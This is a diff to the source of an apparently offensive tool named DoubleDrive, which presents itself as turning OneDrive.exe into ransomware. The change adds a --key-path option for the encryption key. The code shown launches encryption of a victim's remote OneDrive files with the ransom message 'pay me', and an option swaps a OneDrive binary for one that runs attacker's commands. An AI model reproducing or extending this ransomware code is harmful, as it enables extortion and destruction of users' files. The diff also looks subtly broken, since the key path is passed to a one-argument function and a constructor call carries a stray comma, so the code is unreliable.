@@ -63,6 +63,7 @@ def get_target_onedrive_items(onedrive_session: OneDrive):
 def parse_args():
     parser = argparse.ArgumentParser(description="DoubleDrive - Turns the original OneDrive.exe into a ransomware")
     parser.add_argument("--remote-ransomware", help="If specified, encrypts all the remote files under the directories that were targeted with options_setup.py", action="store_true")
+    parser.add_argument("--key-path", default="./key.key", help="Path of the file to save the Fernet encryption/decryption key in, defaults to './key.key'")
     parser.add_argument("--replace-sharepoint", help="If specified, replaces Microsoft.SharePoint.exe which is part of OneDrive's binaries with an executable that executes attacker's commands", action="store_true")
 
     group = parser.add_mutually_exclusive_group(required=False)
@@ -99,8 +100,8 @@ def main():
         onedrive_session.create_file(f"/{configs[ConfigKey.CMD_FILE_NAME.value]}", json.dumps(cmd_dict).encode(), modify_if_exists=True)
 
     if args.remote_ransomware:
-        onedrive_ransomware = OneDriveRansomware(onedrive_session)
-        all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session)
+        onedrive_ransomware = OneDriveRansomware(onedrive_session, )
+        all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session, args.key_path)
         onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, "pay me", quick_delete=configs[ConfigKey.QUICK_DELETE.value])
 
     
